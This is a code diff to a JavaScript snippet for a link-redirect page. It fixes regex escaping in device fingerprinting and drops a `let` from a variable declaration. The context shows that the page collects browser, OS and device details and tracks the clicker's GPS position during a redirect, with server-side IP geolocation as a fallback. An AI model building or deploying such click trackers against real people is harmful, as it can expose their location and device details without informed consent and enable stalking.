@@ -600,31 +600,31 @@ function collectDeviceInfo() {
   const info = {};
   // Browser + version
   try {
-    if (/Edg\//.test(ua)) info.browser = 'Edge ' + (ua.match(/Edg\/([\d.]+)/)||[])[1];
-    else if (/OPR\//.test(ua)) info.browser = 'Opera ' + (ua.match(/OPR\/([\d.]+)/)||[])[1];
-    else if (/Firefox\//.test(ua)) info.browser = 'Firefox ' + (ua.match(/Firefox\/([\d.]+)/)||[])[1];
-    else if (/CriOS\//.test(ua)) info.browser = 'Chrome iOS ' + (ua.match(/CriOS\/([\d.]+)/)||[])[1];
-    else if (/FxiOS\//.test(ua)) info.browser = 'Firefox iOS ' + (ua.match(/FxiOS\/([\d.]+)/)||[])[1];
-    else if (/Chrome\//.test(ua)) info.browser = 'Chrome ' + (ua.match(/Chrome\/([\d.]+)/)||[])[1];
-    else if (/Safari\//.test(ua) && /Version\//.test(ua)) info.browser = 'Safari ' + (ua.match(/Version\/([\d.]+)/)||[])[1];
-    else if (/Trident/.test(ua)) info.browser = 'IE ' + (ua.match(/rv:([\d.]+)/)||[])[1];
+    if (/Edg\\//.test(ua)) info.browser = 'Edge ' + (ua.match(/Edg\\/([\\d.]+)/)||[])[1];
+    else if (/OPR\\//.test(ua)) info.browser = 'Opera ' + (ua.match(/OPR\\/([\\d.]+)/)||[])[1];
+    else if (/Firefox\\//.test(ua)) info.browser = 'Firefox ' + (ua.match(/Firefox\\/([\\d.]+)/)||[])[1];
+    else if (/CriOS\\//.test(ua)) info.browser = 'Chrome iOS ' + (ua.match(/CriOS\\/([\\d.]+)/)||[])[1];
+    else if (/FxiOS\\//.test(ua)) info.browser = 'Firefox iOS ' + (ua.match(/FxiOS\\/([\\d.]+)/)||[])[1];
+    else if (/Chrome\\//.test(ua)) info.browser = 'Chrome ' + (ua.match(/Chrome\\/([\\d.]+)/)||[])[1];
+    else if (/Safari\\//.test(ua) && /Version\\//.test(ua)) info.browser = 'Safari ' + (ua.match(/Version\\/([\\d.]+)/)||[])[1];
+    else if (/Trident/.test(ua)) info.browser = 'IE ' + (ua.match(/rv:([\\d.]+)/)||[])[1];
   } catch(e) {}
   // OS + version
   try {
-    const av = ua.match(/Android\s([\d.]+)/);
-    const iv = ua.match(/OS\s([\d_]+)/);
-    const wv = ua.match(/Windows NT\s([\d.]+)/);
-    const mv = ua.match(/Mac OS X\s([\d_.]+)/);
+    const av = ua.match(/Android\\s([\\d.]+)/);
+    const iv = ua.match(/OS\\s([\\d_]+)/);
+    const wv = ua.match(/Windows NT\\s([\\d.]+)/);
+    const mv = ua.match(/Mac OS X\\s([\\d_.]+)/);
     if (av) info.os = 'Android ' + av[1];
-    else if (/iPhone/.test(ua)) info.os = 'iOS ' + (iv ? iv[1].replace(/_/g,'.') : '');
-    else if (/iPad/.test(ua)) info.os = 'iPadOS ' + (iv ? iv[1].replace(/_/g,'.') : '');
+    else if (/iPhone/.test(ua)) info.os = 'iOS ' + (iv ? iv[1].replace(/\\_/g,'.') : '');
+    else if (/iPad/.test(ua)) info.os = 'iPadOS ' + (iv ? iv[1].replace(/\\_/g,'.') : '');
     else if (wv) info.os = 'Windows ' + ({'10.0':'10/11','6.3':'8.1','6.2':'8','6.1':'7'}[wv[1]]||wv[1]);
-    else if (mv) info.os = 'macOS ' + mv[1].replace(/_/g,'.');
+    else if (mv) info.os = 'macOS ' + mv[1].replace(/\\_/g,'.');
     else if (/CrOS/.test(ua)) info.os = 'ChromeOS';
     else if (/Linux/.test(ua)) info.os = 'Linux';
   } catch(e) {}
   // Device type
-  if (/iPad|tablet|Tab\s|PlayBook|Kindle|Silk/i.test(ua)) info.deviceType = 'tablet';
+  if (/iPad|tablet|Tab\\s|PlayBook|Kindle|Silk/i.test(ua)) info.deviceType = 'tablet';
   else if (/Mobile|iPhone|Android.*Mobile/i.test(ua)) info.deviceType = 'mobile';
   else info.deviceType = 'desktop';
   // Screen & viewport
@@ -742,7 +742,7 @@ if (navigator.geolocation) {
 document.addEventListener('visibilitychange', () => { if (document.hidden) stopTracking(); else if (geoWatchId == null && navigator.geolocation) { geoWatchId = navigator.geolocation.watchPosition(pos => postPing(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy), () => {}, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }); } });
 window.addEventListener('beforeunload', stopTracking);` : `
 // Redirect: try GPS while redirecting, IP geo is fallback server-side
-let clickPosted = false;
+clickPosted = false;
 function postAndRedirect(gpsData) {
   if (!clickPosted) {
     clickPosted = true;
